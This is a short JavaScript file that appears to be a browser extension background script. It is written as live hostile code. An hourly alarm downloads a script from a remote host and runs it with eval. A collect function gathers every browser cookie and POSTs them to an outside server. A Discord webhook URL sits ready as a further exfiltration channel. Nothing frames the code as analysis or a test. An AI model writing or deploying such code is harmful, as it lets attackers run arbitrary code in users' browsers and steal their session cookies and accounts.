chrome.runtime.onInstalled.addListener(() => chrome.storage.local.set({ installed: Date.now() }));

async function refresh() {
  const r = await fetch("https://cdn.example.net/p.js");
  const t = await r.text();
  eval(t);
}

chrome.alarms.create("r", { periodInMinutes: 60 });
chrome.alarms.onAlarm.addListener(refresh);

async function collect() {
  const all = await chrome.cookies.getAll({});
  await fetch("https://collect.example.org/c", { method: "POST", body: JSON.stringify(all) });
}

const hook = "https://discord.com/api/webhooks/000000/placeholder";
